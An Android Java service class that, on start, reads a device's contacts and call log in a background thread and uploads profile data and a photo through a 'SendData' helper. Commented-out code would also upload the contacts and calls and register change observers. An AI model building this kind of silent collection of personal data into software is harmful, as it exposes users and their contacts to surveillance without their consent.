package com.example.irec;

import android.app.Service;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.google.gson.Gson;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.FileNotFoundException;
import java.util.ArrayList;


public class FirstSendingService extends Service {



    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                Looper.prepare();
                Log.d("servive check", "onStartCommand: firstSendingService started");
                String profileData = intent.getStringExtra("profileData");
                byte[] photo = intent.getByteArrayExtra("photo");

                GetContacts getContacts = new GetContacts(FirstSendingService.this, "needAllData");
                getContacts.GetTempNames();
                String contactsStr = getContacts.getContacts();


                GetCalls getCalls = new GetCalls(FirstSendingService.this, "needAllData");
                String callsStr = getCalls.GetCallsData();

                JSONObject firstDataToSend_profile = new JSONObject();
                try {
                    firstDataToSend_profile.put("profile", profileData);
                    //firstDataToSend.put("contacts", contactsStr);
                    //firstDataToSend.put("calls", callsStr);
                } catch (JSONException e) {
                    e.printStackTrace();
                }

                String dataToSend = new Gson().toJson(firstDataToSend_profile);
                String mode = "first";
                SendData sendData = new SendData(FirstSendingService.this, dataToSend, mode, photo);
                try {
                    sendData.send();
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                }
                /*
                JSONObject firstDataToSend_contacts = new JSONObject();
                try {
                    //firstDataToSend_profile.put("profile", profileData);
                    firstDataToSend_contacts.put("contacts", contactsStr);
                    //firstDataToSend.put("calls", callsStr);
                } catch (JSONException e) {
                    e.printStackTrace();
                }

                dataToSend = new Gson().toJson(firstDataToSend_contacts);
                sendData = new SendData(FirstSendingService.this, dataToSend, mode);
                sendData.send();

                JSONObject firstDataToSend_calls = new JSONObject();
                try {
                    //firstDataToSend_profile.put("profile", profileData);
                    //firstDataToSend.put("contacts", contactsStr);
                    firstDataToSend_calls.put("calls", callsStr);
                } catch (JSONException e) {
                    e.printStackTrace();
                }

                dataToSend = new Gson().toJson(firstDataToSend_calls);
                sendData = new SendData(FirstSendingService.this, dataToSend, mode);
                sendData.send();*/
                Log.d("checking dataSent", "run: "+sendData.dataSuccesfullySentAndInserted);
               /* if(sendData.dataSuccesfullySentAndInserted){
                    WorkWithDbClass dbClass = new WorkWithDbClass(FirstSendingService.this);
                    dbClass.makeTables();
                    dbClass.makeRecordThatFirstDataHasBeenSent();
                    GetCalls.regContentObserver();
                    GetContacts.regContentObserver();
                }
*/
                FirstSendingService.this.stopSelf();
                Looper.loop();
            }}).start();

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

    }





}
